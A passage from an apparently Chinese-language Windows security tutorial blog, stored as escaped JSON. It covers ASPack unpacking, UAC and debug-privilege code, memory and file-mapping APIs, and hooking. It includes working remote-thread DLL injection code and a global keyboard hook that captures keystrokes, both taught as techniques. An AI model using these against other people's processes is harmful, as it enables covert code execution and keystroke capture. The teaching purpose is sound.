保存寄存器环境\n001D72DB 81E3 FFFFFF7F AND EBX,0x7FFFFFFF\n001D72E1 53 PUSH EBX \t\t\t\t\t\t\t\t; 压入字符串或是序号\n001D72E2 FFB5 A9050000 PUSH DWORD PTR SS:[EBP+0x5A9]\n001D72E8 FF95 A50F0000 CALL DWORD PTR SS:[EBP+0xFA5] ; 获取函数地址\n001D72EE 85C0 TEST EAX,EAX\n001D72F0 5B POP EBX \t\t\t\t\t\t\t\t\t; 恢复寄存器环境\n\n⑤ 修改属性，跳转原始OEP\n\n\n脱壳分析（aspack.exe 重定位表分析）根据以上分析，这个壳代码支持重定位，所以最好这个程序脱完后也支持重定位，如果感觉到麻烦可以直接执行到OEP后直接dump即可\n\n\n\n\n重定位表\n偏移16000\n大小0xC74\n支持重定位的脱壳首先不能让01257238 66:830E FF OR WORD PTR DS:[ESI],0xFFFF 这条语句执行，他会让脱壳之后的程序运行找不到重定位表\n","slug":"Windows脱壳-基础","date":"2020-10-25T03:08:33.000Z","categories_index":"Windows安全","tags_index":"脱壳","author_index":"Akpigs"},{"id":"c0336200d69e06897233b94f464cbc3b","title":"代码注入与拦截","content":"权限权限管理\n\nUAC机制管理方式在管理员账户下，运行一个程序，也是低权限，只有选择管理员方式运行，才会分配高权限。\n\n\n调整UAC方法1：gpedit\n\n\n方法2 ：设置\n\n\n使用案例BOOL CMy01UACDlg::OnInitDialog()\n&#123;\n\tCDialogEx::OnInitDialog();\n\n\n\t&#x2F;&#x2F; 给按钮加小盾牌\n\t&#x2F;&#x2F; 3. 判断具体的权限状况\n\n\n\t&#x2F;&#x2F; 1. 获得本进程的令牌\n\tHANDLE hToken &#x3D; NULL;\n\tif (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &amp;hToken))\n\t\treturn false;\n\t&#x2F;&#x2F; 2. 获取提升类型\n\tTOKEN_ELEVATION_TYPE ElevationType &#x3D; TokenElevationTypeDefault;\n\tBOOL                 bIsAdmin &#x3D; false;\n\tDWORD                dwSize &#x3D; 0;\n\tif (GetTokenInformation(hToken, TokenElevationType, &amp;ElevationType,\n\t\tsizeof(TOKEN_ELEVATION_TYPE), &amp;dwSize)) &#123;\n\t\t&#x2F;&#x2F; 2.1 创建管理员组的对应SID\n\t\tBYTE adminSID[SECURITY_MAX_SID_SIZE];\n\t\tdwSize &#x3D; sizeof(adminSID);\n\t\tCreateWellKnownSid(WinBuiltinAdministratorsSid, NULL, &amp;adminSID, &amp;dwSize);\n\t\t&#x2F;&#x2F; 2.2 判断当前进程运行用户角色是否为管理员\n\t\tif (ElevationType &#x3D;&#x3D; TokenElevationTypeLimited) &#123;\n\t\t\t&#x2F;&#x2F; a. 获取连接令牌的句柄\n\t\t\tHANDLE hUnfilteredToken &#x3D; NULL;\n\t\t\tGetTokenInformation(hToken, TokenLinkedToken, (PVOID)&amp;hUnfilteredToken,\n\t\t\t\tsizeof(HANDLE), &amp;dwSize);\n\t\t\t&#x2F;&#x2F; b. 检查这个原始的令牌是否包含管理员的SID\n\t\t\tif (!CheckTokenMembership(hUnfilteredToken, &amp;adminSID, &amp;bIsAdmin))\n\t\t\t\treturn false;\n\t\t\tCloseHandle(hUnfilteredToken);\n\t\t&#125;\n\t\telse &#123;\n\t\t\tbIsAdmin &#x3D; IsUserAnAdmin();\n\t\t&#125;\n\t\tCloseHandle(hToken);\n\t&#125;\n\tBOOL bFullToken &#x3D; false;\n\tswitch (ElevationType) &#123;\n\tcase TokenElevationTypeDefault: &#x2F;* 默认的用户或UAC被禁用 *&#x2F;\n\t\tif (IsUserAnAdmin())  bFullToken &#x3D; true; &#x2F;&#x2F; 默认用户有管理员权限\n\t\telse                  bFullToken &#x3D; false;&#x2F;&#x2F; 默认用户不是管理员组\n\t\tbreak;\n\tcase TokenElevationTypeFull:    &#x2F;* 已经成功提高进程权限 *&#x2F;\n\t\tif (IsUserAnAdmin())  bFullToken &#x3D; true; &#x2F;&#x2F;当前以管理员权限运行\n\t\telse                  bFullToken &#x3D; false;&#x2F;&#x2F;当前未以管理员权限运行\n\t\tbreak;\n\tcase TokenElevationTypeLimited: &#x2F;* 进程在以有限的权限运行 *&#x2F;\n\t\tif (bIsAdmin)  bFullToken &#x3D; false;&#x2F;&#x2F;用户有管理员权限，但进程权限有限\n\t\telse           bFullToken &#x3D; false;&#x2F;&#x2F;用户不是管理员组，且进程权限有限\n\t&#125;\n\t&#x2F;&#x2F; 4. 根据权限的不同控制按钮的显示\n\tif (!bFullToken)\n\t\tButton_SetElevationRequiredState(::GetDlgItem(m_hWnd, IDC_BUTTON1),!bFullToken);\n\telse\n\t\t::ShowWindow(::GetDlgItem(m_hWnd, IDC_BUTTON1), SW_HIDE);\n\treturn TRUE;  &#x2F;&#x2F; 除非将焦点设置到控件，否则返回 TRUE\n&#125;\n\n\nvoid CMy01UACDlg::OnBnClickedButton1()\n&#123;\n\t&#x2F;&#x2F; TODO: 在此添加控件通知处理程序代码\n\t&#x2F;&#x2F;以UAC的方式，重新启动程序\n\t\t&#x2F;&#x2F; 1. 获得本进程的令牌\n\n\t&#x2F;&#x2F; 1. 隐藏当前窗口\n\tShowWindow(SW_HIDE);\n\t&#x2F;&#x2F; 2. 获取当前程序路径\n\tWCHAR szApplication[MAX_PATH] &#x3D; &#123; 0 &#125;;\n\tDWORD cchLength &#x3D; _countof(szApplication);\n\tQueryFullProcessImageName(GetCurrentProcess(), 0,\n\t\tszApplication, &amp;cchLength);\n\t&#x2F;&#x2F; 3. 以管理员权限重新打开进程\n\tSHELLEXECUTEINFO sei &#x3D; &#123; sizeof(SHELLEXECUTEINFO) &#125;;\n\tsei.lpVerb &#x3D; L&quot;runas&quot;;      &#x2F;&#x2F; 请求提升权限\n\tsei.lpFile &#x3D; szApplication; &#x2F;&#x2F; 可执行文件路径\n\tsei.lpParameters &#x3D; NULL;          &#x2F;&#x2F; 不需要参数\n\tsei.nShow &#x3D; SW_SHOWNORMAL; &#x2F;&#x2F; 正常显示窗口\n\tif (ShellExecuteEx(&amp;sei))\n\t\texit(0);\n\telse\n\t\tShowWindow( SW_SHOWNORMAL);\n&#125;\n\n\nvoid CMy01UACDlg::OnBnClickedButton2()\n&#123;\n\tEnableDebugPrivilege(TRUE);\n&#125;\n\nBOOL CMy01UACDlg::EnableDebugPrivilege(BOOL fEnable) &#123;   &#x2F;&#x2F;提升为调试权限\n\tBOOL fOk &#x3D; FALSE;    HANDLE hToken;\n\t&#x2F;&#x2F; 以修改权限的方式，打开进程的令牌\n\tif (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES,\n\t\t&amp;hToken)) &#123;\n\t\t&#x2F;&#x2F; 令牌权限结构体\n\t\tTOKEN_PRIVILEGES tp;\n\t\ttp.PrivilegeCount &#x3D; 1;\n\t\t&#x2F;&#x2F;获得LUID\n\t\tLookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;tp.Privileges[0].Luid);\n\t\ttp.Privileges[0].Attributes &#x3D; fEnable ? SE_PRIVILEGE_ENABLED : 0;\n\t\tAdjustTokenPrivileges(hToken, FALSE, &amp;tp, sizeof(tp), NULL, NULL); &#x2F;&#x2F;修改权限\n\t\tfOk &#x3D; (GetLastError() &#x3D;&#x3D; ERROR_SUCCESS);\n\t\tCloseHandle(hToken);\n\t&#125;\n\treturn(fOk);\n&#125;\n\n内存管理Windows系统使用虚拟内存的好处是什么\na) 无论物理内存实际有多大，每一个进程都有4GB的虚拟地址空间。b) 每一个进程在虚拟地址空间的使用上都是相似的，低2GB是用户空间，高2GB是系统空间，低2GB的用户代码空间的代码无法访问高2GB系统空间。c) 在进程中使用的全部都是虚拟地址，具体虚拟地址到物理地址的转换由操作系统内核完成，故而你无法在自己的进程中访问到其他进程的内存，虽然大家的地址长得如此类似。d) 一个进程的虚拟空间只有使用一部分与物理内存有映射关系，并且windows尽量保证对于不同进程的同一份数据，在物理内存中只有一份，分别映射到多个进程中。从而节约内存。e) 当各个进程所使用的内存数量超出物理内存的时候，操作系统还能够将物理内存中暂时用不到的数据交换到硬盘中。\n堆的管理\n\n\nAPI\n说明\n\n\n\nHeapCreate\n在进程中创建一个堆，返回一个堆句柄\n\n\nGetProcessHeap\n获取当前进程中的一个堆，返回一个句柄\n\n\nGetProcessHeaps\n获取进程中的所用堆，堆的数量和堆的各个句柄\n\n\nHeapAlloc\n从指定的堆上分配块\n\n\nHeapReAlloc\n重新分配内存，改变已经分配好的堆内存块大小\n\n\nGetSystemInfo\n获取系统信息\n\n\nHeapSize\n获取指定堆的大小\n\n\nHeapFree\n释放HeapAlloc和HeapReAlloc申请的内存\n\n\nHeapDestroy\n销毁由HeapCreate创建的堆\n\n\nCreateToolhelp32Snapshot\n可以分别创建进程、线程、进程模块、进程堆的快照\n\n\nHeap32First\n用来首次调用，获得第一个堆对象的信息\n\n\nHeap32Next\n以后的调用由他来完成，不断的获取堆对象信息\n\n\n基本使用void Test()\n&#123;\n\t&#x2F;&#x2F;我们不创建堆，进程也会有默认的堆\n\tHANDLE      hHeap &#x3D; GetProcessHeap(); &#x2F;&#x2F; 获取默认堆\n\tSYSTEM_INFO si;                       &#x2F;&#x2F;系统信息\n\tGetSystemInfo(&amp;si);                   &#x2F;&#x2F; 获取系统信息\n\t&#x2F;&#x2F;在堆上分配3个页面大小的内存\n\tLPVOID lpMem &#x3D; HeapAlloc(hHeap, HEAP_ZERO_MEMORY, si.dwPageSize * 3);\n\tHeapFree(hHeap, 0, lpMem);\n\t&#x2F;&#x2F;默认堆，不应该去销毁它\n\t&#x2F;&#x2F;HeapDestroy( hHeap );\n&#125;\n\n\n\nint main()\n&#123;\n\tTest();\n\t&#x2F;&#x2F;1 创建一个堆\n\tHANDLE      hHeap &#x3D; HeapCreate(0, 0, 0);\n\tSYSTEM_INFO si;     &#x2F;&#x2F;系统信息\n\tGetSystemInfo(&amp;si); &#x2F;&#x2F; 获取系统信息，主要是为了获取内存分页大小\n\t&#x2F;&#x2F;在堆上分配3个页面大小的内存\n\tLPVOID lpMem &#x3D; HeapAlloc(hHeap, HEAP_ZERO_MEMORY, si.dwPageSize * 3);\n\t&#x2F;&#x2F;。。。。。\n\t&#x2F;&#x2F;释放堆内存\n\tHeapFree(hHeap, 0, lpMem);\n\t&#x2F;&#x2F;销毁堆，这个堆，没有任何需要使用的内存了，就销毁\n\tHeapDestroy(hHeap);\n\n&#125;\n\n使用场景：\n一般情况下，咱么都是使用malloc或者new。如果有以下场景可以尝试使用堆，假如咱们的程序需要大量的去申请小块的内存，管理这些地址，就会比较麻烦，此时就可以使用自己创建的堆，在用完了内存之后，去直接销毁堆，此时内存就自动释放了，也就免去了挨个去释放的麻烦。\n遍历堆和遍历进程，线程一致的，使用快照去遍历即可。\n虚拟内存管理函数\n\n\n作用\n函数名\n说明\n\n\n\n分配\nVirtualAlloc\n分配或预定一块虚拟内存\n\n\n\nVirtualAllocEx\n可以在其他进程分配或预定一块虚拟内存\n\n\n释放\nVirtualFree\n将一块虚拟内存释放\n\n\n\nVirtualFreeEX\n可以将释放其他进程的内存\n\n\n锁定与解锁\nVirtualLook\n可以将内存锁定，不能交换数据到硬盘\n\n\n\nVirtualUnlook\n为内存解锁\n\n\n修改保护属性\nVirtualProtect\n修改一块虚拟内存的属性\n\n\n\nVirtualProtectEx\n可以修改其他内存的属性\n\n\n读写其他进程内存\nReadProcessMemory\n读写远程进程的内存数据\n\n\n\nWriteProcessMemory\n将数据写入远程进程内存\n\n\n查询内存状态\nVirtualQuery\n查询内存状态\n\n\n\nVirtualQueryEx\n可以查询其他内存状态\n\n\n安全属性\n\n\n属性\n值\n描述\n\n\n\nPAGE_NOACCESS\n0x01\n不可访问\n\n\nPAGE_READONLY\n0x02\n只读\n\n\nPAGE_READWRITE\n0x04\n可读可写\n\n\nPAGE_WRITECOPY\n0x08\n可写可读\n\n\nPAGE_EXECUTE\n0x10\n可执行\n\n\nPAGE_EXECUTE_READ\n0x20\n可读可执行\n\n\nPAGE_EXECUTE_READWRITE\n0x40\n可读可写可执行\n\n\nPAGE_EXECUTE_WRITECOPY\n0x80\n可执行，写时复制\n\n\nPAGE_GUARD\n0x100\n\n\n\nPAGE_NOCACHE\n0x200\n\n\n\nPAGE_WRITECOMBINE\n0x400\n\n\n\nPAGE_GRAPHICS_NOACCESS\n0x0800\n\n\n\nPAGE_GRAPHICS_READONLY\n0x1000\n\n\n\nPAGE_GRAPHICS_READWRITE\n0x2000\n\n\n\nPAGE_GRAPHICS_EXECUTE\n0x4000\n\n\n\nPAGE_GRAPHICS_EXECUTE_READ\n0x8000\n\n\n\nPAGE_GRAPHICS_EXECUTE_READWRITE\n0x10000\n\n\n\nPAGE_GRAPHICS_COHERENT\n0x20000\n\n\n\nPAGE_ENCLAVE_THREAD_CONTROL\n0x80000000\n\n\n\nPAGE_REVERT_TO_FILE_MAP\n0x80000000\n\n\n\nPAGE_TARGETS_NO_UPDATE\n0x40000000\n\n\n\nPAGE_TARGETS_INVALID\n0x40000000\n\n\n\nPAGE_ENCLAVE_UNVALIDATED\n0x20000000\n\n\n\nPAGE_ENCLAVE_DECOMMIT\n0x10000000\n\n\n\n申请和释放int main()\n&#123;\n\t&#x2F;&#x2F;1 申请\n\tLPVOID lpvResult &#x3D; VirtualAlloc(\n\t\tNULL,\n\t\t4097,              &#x2F;&#x2F; 4KB * 1\n\t\tMEM_RESERVE | MEM_COMMIT,   &#x2F;&#x2F; 预定并调拨内存\n\t\tPAGE_READWRITE);            &#x2F;&#x2F; 可读写\n\t&#x2F;&#x2F;使用\n\twcscpy_s((LPWSTR)lpvResult, wcslen(L&quot;Hello!&quot;)+2, L&quot;World!&quot;);\n\tMessageBox(NULL, (LPWSTR)lpvResult, NULL, MB_OK);\n\t&#x2F;&#x2F;释放\n\tVirtualFree(lpvResult, 1, MEM_RELEASE);\n&#125;\n\n修改保护属性int main()\n&#123;\n\tchar* p &#x3D; (char*)&quot;hello World&quot;;\n\tDWORD dwNewProtect &#x3D; PAGE_READWRITE;\n\tDWORD dwOldProtect &#x3D; 0;\n\tVirtualProtect(p, 1, dwNewProtect, &amp;dwOldProtect);\n\tp[0] &#x3D; &#39;m&#39;;\n\tp[1] &#x3D; &#39;k&#39;;\n\tp[2] &#x3D; &#39;m&#39;;\n&#125;\n\n文件映射可以将文件直接映射进内存的一种技术。\n\n\n\nAPI\n说明\n\n\n\nGetSystemInfo\n获取系统信信息，用于确定分配粒度\n\n\nCreateFileMapping\n创建一个mapping对象\n\n\nOpenFileMapping\n打开已命名的mapping对象（可跨进程）\n\n\nUnmapViewOfFile\n取消文件映射\n\n\nMapViewOfFile\n将mapping对象的文件映射到内存\n\n\nFlushViewOfFile\n将映射到内存的文件写回到硬盘\n\n\n有两个作用：\n1 操作文件比较方便\nint main()\n&#123;\n\t&#x2F;&#x2F;1. 打开文件，得到一个文件句柄\n\tHANDLE hFile &#x3D;  CreateFile(\n\t\tL&quot;D:\\\\test\\\\123.txt&quot;,\n\t\tGENERIC_READ | GENERIC_WRITE,\n\t\tNULL,\n\t\tNULL,\n\t\tOPEN_EXISTING,\n\t\tFILE_ATTRIBUTE_NORMAL,\n\t\t0\n\t);\n\t&#x2F;&#x2F;2. 创建一个文件映射对象，和文件句柄关联如果，要超过文件大小的话\n\t&#x2F;&#x2F;   创建的时候，就需要写一个大小。\n\t&#x2F;&#x2F;   \n\tHANDLE hFileMapping  &#x3D; \n\t\tCreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, 100, 0);\n\t&#x2F;&#x2F;3. 将文件映射到内存\n\tchar *p &#x3D; (char*)MapViewOfFile(hFileMapping, FILE_MAP_ALL_ACCESS, 0,0, 0);\n\n\t&#x2F;&#x2F;4. 读取或者写入\n\tstrcpy_s(p, 100,&quot;15pb hello  15pb hello&quot;);\n\n\t&#x2F;&#x2F;5. 文件映射的写入，会自动刷，也可以手动刷 \n\tFlushViewOfFile(p, 0);\n\t&#x2F;&#x2F;6. 关闭句柄\n\tCloseHandle(hFileMapping);\n\tCloseHandle(hFile);\n\n&#125;\n\n2 文件映射是一个内核对象，可以在多进程中去访问，所以文件映射也是一种进程间通讯机制。\n进程间通讯通讯A端&#x2F;&#x2F; 06_进程间通讯.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。\n&#x2F;&#x2F;\n\n#include &lt;iostream&gt;\n#include &lt;Windows.h&gt;\nint main()\n&#123;\n\t&#x2F;&#x2F;1 创建文件映射\n\tHANDLE hFileMapping &#x3D;\n\t\tCreateFileMapping(\n\t\t\tINVALID_HANDLE_VALUE, \n\t\t\tNULL, PAGE_READWRITE, \n\t\t\t0, \n\t\t\t100,\n\t\t\tL&quot;hello 15pb&quot;&#x2F;&#x2F;起了名字，别的进程才能打开它\n\t\t);\n\t&#x2F;&#x2F;2 映射内存\n\tchar* pBuf &#x3D; (char*)MapViewOfFile(hFileMapping, FILE_MAP_ALL_ACCESS, 0, 0, 16);\n\n\tpBuf[0] &#x3D; 1;\n\n\t&#x2F;&#x2F;3 时刻检测，第一个字节是否被修改了\n\twhile (pBuf[0] &#x3D;&#x3D; 1)\n\t&#123;\n\n\t&#125;\n\t&#x2F;&#x2F;4 如果被修改了，那么就结束\n\tprintf(&quot;数据已经被更改&quot;);\n\tCloseHandle(hFileMapping);\n&#125;\n\n通讯B端#include &lt;iostream&gt;\n#include &lt;Windows.h&gt;\nint main()\n&#123;\n\t&#x2F;&#x2F; 1. 打开文件Mapping\n\tHANDLE hMapFile &#x3D; OpenFileMapping(FILE_MAP_ALL_ACCESS,\n\t\tFALSE, L&quot;hello 15pb&quot;);\n\t&#x2F;&#x2F;2. 映射到内存\n\tchar* pBuf &#x3D; (char*)MapViewOfFile(hMapFile, FILE_MAP_ALL_ACCESS,\n\t\t0, 0, 0);\n\t&#x2F;&#x2F;3. 修改数据\n\tpBuf[0] &#x3D; 0;\n\t&#x2F;&#x2F;4. 通讯完毕，退出\n\tprintf(&quot;数据已经更改完毕了&quot;);\n\tCloseHandle(hMapFile);\n&#125;\n\n虚拟内存的遍历SIZE_T WINAPI VirtualQueryEx(\n  _In_      HANDLE hProcess,   &#x2F;&#x2F; 进程句柄\n  _In_opt_  LPCVOID lpAddress, &#x2F;&#x2F; 查询地址\n  _Out_     PMEMORY_BASIC_INFORMATION lpBuffer,\n  _In_      SIZE_T dwLength    &#x2F;&#x2F; 传出结构体的大小\n);\n\ntypedef struct _MEMORY_BASIC_INFORMATION &#123;\n    PVOID  BaseAddress;       &#x2F;&#x2F; 将参数向下取整到页面大小\n    PVOID  AllocationBase;    &#x2F;&#x2F; 区域地址，此区域包含传入地址\n    DWORD  AllocationProtect; &#x2F;&#x2F; 此区域在预定时的保护属性\n    SIZE_T RegionSize;        &#x2F;&#x2F; 区域的大小\n    DWORD  State;             &#x2F;&#x2F; 区域的页面状态[注1]\n    DWORD  Protect;           &#x2F;&#x2F; 页面保护属性\n    DWORD  Type;              &#x2F;&#x2F; 页面类型[注2]\n&#125; MEMORY_BASIC_INFORMATION, *PMEMORY_BASIC_INFORMATION;\n\n页面的状态\n\n\n状态\n值\n说明\n\n\n\n空闲的(Free)\n0x00010000\n进程不能访问这种页面，此页面还没有被分配。\n\n\n保留的(reserve)\n0x00002000\n这个页面被预定了。但是还未与物理内存映射，因此这里也是不能访问的。\n\n\n提交的(commit)\n0x00001000\n内存已经被分配了，并且也与物理存储器映射了，进程已经可以访问这里\n\n\n页面类型\n\n\n映射方式\n描述\n\n\n\nprivate\n进程私有内存,不被其他进程所共享, 一般是堆,栈\n\n\nmapped\n从别的进程内存映射而来\n\n\nimage\n从程序的PE映像映射而来,一般是映像的区段.\n\n\n遍历代码#include &lt;Windows.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;TlHelp32.h&gt;\n#include &lt;string&gt;\nusing std::wstring;\nvoid EnumProcess();\nvoid EnumVirtualMemroy(HANDLE Process);\nMEMORY_BASIC_INFORMATION VirtualMemroy;\nint main()\n&#123;\n\tEnumProcess();\n\t\n\treturn 0;\n&#125;\n\n&#x2F;&#x2F;遍历进程\nvoid EnumProcess()\n&#123;\n\twstring buffer;\n\n\t&#x2F;&#x2F; 2. 创建一个快照用于遍历进程，参数2可以留空\n\tHANDLE Snapshot &#x3D; CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);\n\n\t&#x2F;&#x2F; 3. 创建一个用于保存进程信息的结构体\n\tPROCESSENTRY32 ProcessInfo &#x3D; &#123; sizeof(PROCESSENTRY32) &#125;;\n\n\t&#x2F;&#x2F; 4. 尝试遍历第一个进程的信息，成功就继续，失败就跳过\n\tif (Process32First(Snapshot, &amp;ProcessInfo))\n\t&#123;\n\t\tdo &#123;\n\t\t\t\t&#x2F;&#x2F; 5.5.2 通过指定的权限获取进程句柄\n\t\t\t\tHANDLE Process &#x3D; OpenProcess(PROCESS_QUERY_INFORMATION,FALSE, ProcessInfo.th32ProcessID);\n\t\t\t\tif (Process&amp;&amp; Process !&#x3D; INVALID_HANDLE_VALUE)\n\t\t\t\t&#123;\n\t\t\t\t\t&#x2F;&#x2F; 5.5.3 通过API查询到进程对应的Exe的路径，获取不到是因为权限不够\n\t\t\t\t\t&#x2F;&#x2F;QueryFullProcessImageName(Process, 0, ImagePath, &amp;PathSize);\n\t\t\t\t\tprintf(&quot;%ls\\n&quot;, ProcessInfo.szExeFile);\n\t\t\t\t\tEnumVirtualMemroy(Process);\n\t\t\t\t\t&#x2F;&#x2F; 5.5.4 关闭句柄并打印数据\n\t\t\t\t\tCloseHandle(Process);\n\t\t\t\t&#125;\n\n\t\t\t&#x2F;&#x2F; 6. 尝试遍历进程快照内的下一个进程\n\t\t&#125; while (Process32Next(Snapshot, &amp;ProcessInfo));\n\t&#125;\n\n&#125;\n&#x2F;&#x2F;虚拟内存的遍历\nvoid EnumVirtualMemroy(HANDLE Process)\n&#123;\n\tint dwLength &#x3D; sizeof(MEMORY_BASIC_INFORMATION);\n\tLPVOID Base &#x3D; NULL;\n\twhile (Base&lt;(LPVOID)0x7fffffff)\n\t&#123;\n\t\tVirtualQueryEx(Process, Base, &amp;VirtualMemroy, dwLength);\n\n\t\tBase &#x3D; (LPVOID)((DWORD)Base + VirtualMemroy.RegionSize);\n\n\t\tprintf(&quot;\\t类型：%d\\t属性：%d\\t状态：%d\\t大小：%d\\n&quot;,\n\t\t\tVirtualMemroy.Type,\n\t\t\tVirtualMemroy.AllocationProtect,\n\t\t\tVirtualMemroy.State,\n\t\t\tVirtualMemroy.RegionSize\n\t\t);\n\t&#125;\n&#125;\n\nDll注入注：职业黑客的必修课\n重点内容）\n1 什么是DLL注入？？为什么要DLL注入？？\n在一个本来不需要加载此DLL的进程中，强行的使其加载此DLL文件。那么这个就叫做DLL注入技术。\n我们在向一个进程中注入我们自己的DLL，相当于在对方的进程中加入了我们自己的代码，可以修改对方程序的功能。\n游戏辅助，输入法，对于软件行为的拦截。\n2 DLL注入的方式有哪些？？\n远程线程注入\n消息钩子注入\n注册表注入\nAPC注入\n输入法注入\n远程线程注入#include &lt;Windows.h&gt;\n#include &lt;stdio.h&gt;\n\n#define DLLPATH  L&quot;DLL地址&quot;\nint main()\n&#123;\n\t&#x2F;&#x2F;通过ID获得目标句柄\n\tHANDLE hHandle &#x3D; OpenProcess(PROCESS_ALL_ACCESS,FALSE,9740);\n\t&#x2F;&#x2F;先获取字符串长度\n\tint  nLength &#x3D; wcslen(DLLPATH);\n\t&#x2F;&#x2F;在目标进程中申请一块空间\n\tLPVOID address &#x3D; VirtualAllocEx(hHandle,0, nLength*2+2,MEM_COMMIT,PAGE_READWRITE);\n\t&#x2F;&#x2F;将DLL名字写入到目标进程之前还需要一个参数是返回的实际写入大小\n\tDWORD dwConst &#x3D; 0;\n\t&#x2F;&#x2F;将DLL名字写入到目标进程空间\n\tWriteProcessMemory(hHandle, address,DLLPATH, nLength * 2 + 2, &amp;dwConst);\n\t&#x2F;&#x2F;创建远程线程\n\tHANDLE hRhread &#x3D; CreateRemoteThread(hHandle,0,0,(LPTHREAD_START_ROUTINE)LoadLibrary, address,0,0);\n\t&#x2F;&#x2F;等待线程执行完成\n\tWaitForSingleObject(hRhread,-1);\n\t&#x2F;&#x2F;销毁在目标进程申请的空间\n\tVirtualFreeEx(hHandle, address, nLength * 2 + 2,MEM_COMMIT);\n\t&#x2F;&#x2F;线程计数-1\n\tCloseHandle(hRhread);\n\treturn 0;\n&#125;\n\n4 关于64位的注入\n32位的dll正常情况只能注入到32位程序中，注入程序也应该是32位，64位的dll正常情况只能注入到64位的程序中，注入程序也应该是64位。\n消息钩子注入什么是Hook，这个概念应该从何说起？？？\nHook：是钩子的意思\nHook技术主要指的是拦截程序原有的信息，数据，代码，\n1 使得你有机会对拦截到的信息数据做处理。然后再交给原来的程序去使用，从而能够截获到程序的关键信息。可以查看，也可以修改。\n2 能够修改程序的部分功能。\n2 Hook是怎么分类的？？\n在windows系统下，有两类Hook：\n2.1 windows消息Hook。windows提供的能够让程序员截获到所有窗口程序消息的机制。\n 消息Hook也是我们的一种Dll注入手段。\n2.2 自定义Hook 非常普遍的Hook方式，也是我们通常意义所说的Hook。\n 2.2.1 修改程序的代码，使得其能够执行到Hook者提供的“善意代码”中。 inline-Hook\n 2.2.2 修改存储函数地址的变量，当程序从变量中获取函数地址并调用的时候，就会调用到Hook者提供的“善意代码”了。\n IAT-Hook\n IDT-Hook\n SYSENTR-Hook\n3 windows消息钩子的实现的原理以及代码\n3.1 windows消息钩子的实现的原理\nSetWindowsHookEx这个函数，能够实现的功能是截获 1 系统中所有的窗口程序的消息或者 2 某一个线程的窗口消息。\n截获到了消息，必然是需要执行自己的代码，自己的代码需要放置在一个dll中，然后消息钩子设置成功之后，会将dll注入到目标进程，从而使得自己的回调函数能够在对方的进程中执行。\n额外的知识点：窗口程序的消息是被某一个线程获取到的，哪一个线程创建了窗口，哪一个线程就能够获得此窗口的消息。此线程在创建完窗口之后，就变成了GUI线程。\nHHOOK SetWindowsHookExA(\n int       idHook,   &#x2F;&#x2F; 要截获的是哪种类型的消息\n  HOOKPROC  lpfn,     &#x2F;&#x2F;截获到消息之后，调用的回调函数\n  HINSTANCE hmod,     &#x2F;&#x2F;回调函数所在的模块，这个模块需要是一个dll。\n  DWORD     dwThreadId  &#x2F;&#x2F;填0  截获系统中所有的窗口的消息  填线程ID  那就仅截获此线程的窗口消息\n);\n\n&#x2F;&#x2F;当钩子使用完毕之后，卸载钩子\nBOOL WINAPI UnhookWindowsHookEx(\n    _In_ HHOOK hhk      &#x2F;&#x2F;填充返回的句柄\n    );\n\n在钩子的消息拦截函数的最后，应该调用这个函数，因为程序可能会有多个钩子，新添加的在最上面，为了不影响其他钩子的功能，需要调用这个函数。\nWINUSERAPI\nLRESULT\nWINAPI\nCallNextHookEx(\n    _In_opt_ HHOOK hhk,    &#x2F;&#x2F;钩子的句柄\n    _In_ int nCode,\n    _In_ WPARAM wParam,\n    _In_ LPARAM lParam);\n\n消息钩子的代码\n#define _countof(a) sizeof(a)&#x2F;sizeof(a[0])\nHHOOK g_Hook &#x3D; 0;\n&#x2F;&#x2F;拦截消息的回调函数\nLRESULT CALLBACK KeyboardProc(\n    int code,           &#x2F;&#x2F; 消息类型\n    WPARAM wParam,      &#x2F;&#x2F; 虚拟码\n    LPARAM lParam) &#123;    &#x2F;&#x2F; 按键信息\n    &#x2F;&#x2F; 判断是否wParam与lParam都有键盘消息，是的话则执行打印操作\n    if (code &#x3D;&#x3D; HC_ACTION) &#123;\n        &#x2F;&#x2F; 将256个虚拟键的状态拷贝到指定的缓冲区中，如果成功则继续\n        BYTE KeyState[256] &#x3D; &#123; 0 &#125;;\n        if (GetKeyboardState(KeyState)) &#123;\n            &#x2F;&#x2F; 得到第16–23位，键盘虚拟码\n            LONG  KeyInfo &#x3D; lParam;\n            UINT  keyCode &#x3D; (KeyInfo &gt;&gt; 16) &amp; 0x00ff;\n            WCHAR wKeyCode &#x3D; 0;\n            ToAscii((UINT)wParam, keyCode, KeyState, (LPWORD)&amp;wKeyCode, 0);\n            &#x2F;&#x2F; 将其打印出来\n            WCHAR szInfo[512] &#x3D; &#123; 0 &#125;;\n            swprintf_s(szInfo, _countof(szInfo), L&quot;Hook_%c&quot;, (char)wKeyCode);\n            OutputDebugString(szInfo);\n            return 0;\n        &#125;\n    &#125;\n    return CallNextHookEx(g_Hook, code, wParam, lParam);\n&#125;\n&#x2F;&#x2F;开启Hook的函数\nvoid OnHook()\n&#123;\n    HMODULE hModule &#x3D;  GetModuleHandle(L&quot;MessageHookdll.dll&quot;);\n    g_Hook &#x3D; SetWindowsHookEx(\n        WH_KEYBOARD,\n        KeyboardProc,\n        hModule,\n        NULL\n    );\n&#125;\n&#x2F;&#x2F;关闭Hook的函数\nvoid UnHook()\n&#123;\n    if (g_Hook!&#x3D;0)\n    &#123;\n        UnhookWindowsHookEx(g_Hook);\n        g_Hook &#x3D; 0;\n    &#125;\n&#125;\n\n消息钩子使用了调试函数 OutputDebugString(szInfo);输出按键码，但我们看不到对方程序的调试信息，可以通过下图程序查看\n\n\n自定义钩子：\n自定义钩子两大类：内联钩子 修改存储函数地址变量的钩子\n4.1 什么是内联钩子 inline-Hook\n任何位置，都可以修改为jmp，使其执行到此处时，能够跳转到我们自己的代码去执行：\n1 被修改的指令，是否是有用的，如果是有用的，那么你就需要在你自己的代码中，将有用的指令写一遍，使其在你代码中能够执行。\n2 jmp指令一般是5个字节，所以我们选取的指令最好也是5个字节，如果不是5个字节，那么会发生指令截断，跳转回来的时候，就需要考虑跳转到完整的指令后去执行程序本身的代码。\n3 jmp指令OPCODE的操作数怎么求得，也是Hook的关键知识点\njmp指令OPCODE的操作数 &#x3D; 